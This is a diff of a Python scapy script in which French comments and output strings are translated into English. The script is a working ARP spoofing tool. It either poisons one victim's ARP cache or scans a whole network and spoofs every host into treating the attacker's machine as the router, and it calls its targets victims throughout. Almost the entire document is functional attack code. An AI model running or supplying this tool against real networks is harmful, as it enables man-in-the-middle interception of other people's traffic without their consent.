@@ -9,13 +9,13 @@ import time
 import argparse
 
 
-# Nettoyer réseau
+# Clean the network
 def signal_handler(sig, frame):
   global victim_ip
   global routeur_ip
   global victim_mac
   global routeur_mac    
-  print('\n [!] Restoration réseau de la victime')
+  print('\n [!] Restoring the victim's network')
   send(ARP(pdst=victim_ip, macdst=victim_mac, psrc=routeur_ip, macsrc=routeur_mac, op=2), count=5, inter=.2)
 
   sys.exit(0)
@@ -26,9 +26,9 @@ from scapy.all import *
 conf.verb = 0
 
 
-#------------------------- FONCTIONS SPOOFING/SNIFFING ARP ----------------------------
+#------------------------- SPOOFING/SNIFFING ARP FUNCTIONS ----------------------------
 
-#-----------------------------------UNE VICTIME ---------------------------------------
+#-----------------------------------ONE VICTIM ---------------------------------------
 
 def single():
   sniff(filter="arp and host "+routeur_ip, prn=arp_sniffing1)
@@ -39,36 +39,36 @@ def arp_spoof1():
   arp = ARP(pdst=victim_ip, psrc=routeur_ip, op="is-at")
   packet = ethernet / arp
   sendp(packet, iface=iface)
-  print("[*]Envoi")
+  print("[*]Sent")
 
 
 def arp_sniffing1(pkt):
     if pkt[ARP].op == 1:  # is-at (response)
-        print('\n\n[i] Réponse : ( {0} ) adresse : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
+        print('\n\n[i] Response : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
         arp_spoof1()
 
 
-#------------------------------- ATTAQUE TOUT LE RÉSEAU ---------------------------
+#------------------------------- NETWORK ATTACK ----------------------------
 
 def all():
   sniff(filter="arp and host "+routeur_ip, prn=arp_sniffing2)
 
 
-def arp_spoof2(): #Obtenir toutes les adresses MAC du réseau + les spoofer
+def arp_spoof2(): # Get all MAC addresses of the network + spoof them
   # Création paquet ARP
   arp = ARP(pdst=victim_ip)
-  # Créer le paquet Broadcast Ether
-  # ff:ff:ff:ff:ff:ff c'est le broadcast (MAC)
+  # Create Broadcast Ether package
+  # ff:ff:ff:ff:ff:ff broadcast (MAC addr)
   ether = Ether(dst="ff:ff:ff:ff:ff:ff")
   # stack them
   packet = ether/arp
   result = srp(packet, timeout=3, verbose=0)[0]
-  # a list of clients, we will fill this in the upcoming loop
+  # a list of victims, we will fill this in the upcoming loop
   victimes = []
   for sent, received in result:
-      # Pour chaque réponse, on ajoute ip et mac à la liste `victimes`
+      # For each response, we add ip and mac to the 'victimes' list
       victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
-  # On affiche toutes les victimes du réseaus
+  # Print all network victims
   print("\nEQUIPEMENTS CONNECTÉS AU RÉSEAU")
   print("IP" + " "*18+"MAC")
   for x in victimes:
@@ -76,48 +76,47 @@ def arp_spoof2(): #Obtenir toutes les adresses MAC du réseau + les spoofer
 
   ethernet = Ether()
   for x in victimes:
-    if x['ip']==routeur_ip: #On supprime l'adresse IP du routeur car on ne veut pas lui envoyer de packet ARP
+    if x['ip']==routeur_ip: # Delete router IP addr bc we don't want to send them an ARP packet 
       del x['ip']
     else:
       arp = ARP(pdst=x['ip'], psrc=routeur_ip, op="is-at")
       packet = ethernet / arp
       sendp(packet, iface=iface)
-      print("[*]Envoi a ( {0} )".format(x['ip']))
+      print("[*]Sent to ( {0} )".format(x['ip']))
 
 
 def arp_sniffing2(pkt):
   if pkt[ARP].op == 1:  # is-at (response)
-        print('\n\n[i] Réponse : ( {0} ) adresse : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
+        print('\n\n[i] Response : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
         arp_spoof2()
 
 
 #----------------------------------- MAIN PROGRAM ------------------------------------
-print('[*] Début... [*]')
-
+print('[*] Starting... [*]')
 
 #---------------------------------- ARGUMENTS -------------------------------------
 parser = argparse.ArgumentParser()
-#a pour all
+#a for all
 parser.add_argument('-a', dest='a', action='store_true', help="shows a")
 
-#s pour single
+#s for single
 parser.add_argument('-s', dest='s', action='store_true', help="shows s")
 
 args = parser.parse_args()
 
 
-#Entrée interface
-print("Entrez interface :")
+# Interface input
+print("Interface :")
 iface=input()
 
-# Obtenir notre IP et MAC
+# Get our IP and MAC addr
 me_ip = get_if_addr(iface)
 me_mac = get_if_hwaddr(iface)
 
-#Affichage infos sur le hacker (nous-même)
+# Print our infos (hacker)
 print('\n[i] Mon adresse IP : ( {0} ) et ma mac : ( {1} )'.format(me_ip, me_mac))
 
-#Définition globale du routeur suivant l'interface
+# Router global definition 
 routeur_ip=conf.route.route("0.0.0.0")[2]
 x = sr1(ARP(pdst=routeur_ip), iface=iface, timeout=2)
 routeur_mac = x.hwsrc
@@ -127,32 +126,31 @@ routeur_mac = x.hwsrc
 #--------------------------------------- MAIN !!! -----------------------------------------------
 #------------------------------------------------------------------------------------------------
 
-#Selon les arguments (soit on attaque tout le réseau, soit juste une victime)
-#s pour single et a pour all !
+# Depending on the arguments (either we attack the whole network or just one victim)
 
-#Attaque de tout le réseau!
+# Network attack
 try:
   if args.a:
-    print("Entrez le réseau :")
+    print("Network IPv4 :")
     victim_ip= input()
     
-    print("\n[*] On attaque le réseau %s sur l'interface %s [*]"%(victim_ip, iface))
-    print('[i] On attaque le routeur ( {0} ), MAC ( {1} )'.format(routeur_ip, routeur_mac))
+    print("\n[*] Attacking the network %s on iface %s [*]"%(victim_ip, iface))
+    print('[i] Attacking the routeur ( {0} ), MAC address ( {1} )'.format(routeur_ip, routeur_mac))
     all()
 
-  #Attaque d'une seule victime sur le réseau
+  # Single victim attack 
   if args.s:
-    print("Entrez la victime :")
+    print("Victim IPv4 :")
     victim_ip=input()
-    x = sr1(ARP(pdst=victim_ip), iface=iface, timeout=2) #Comme il s'agit d'une seule victime, nous avons besoin de sa MAC (pour la fonction signal_handler)
+    x = sr1(ARP(pdst=victim_ip), iface=iface, timeout=2) # Since it is a single victim, we need its MAC (for the signal_handler function)
     victim_mac = x.hwsrc
 
-    print('\n[i] On attaque la victime ( {0} ), MAC ( {1} )'.format(victim_ip, victim_mac))
-    print('[i] On attaque le routeur ( {0} ), MAC ( {1} )'.format(routeur_ip, routeur_mac))
+    print('\n[i] Attacking the victim ( {0} ), MAC address ( {1} )'.format(victim_ip, victim_mac))
+    print('[i] Attacking the router ( {0} ), MAC address ( {1} )'.format(routeur_ip, routeur_mac))
     single() 
 
 except:
-  print("[!] Fermeture du programme...")
+  print("[!] Closing program...")
               
       
-#Arrêt du programme avec Ctrl+C
+# Stop program with CTRL+C
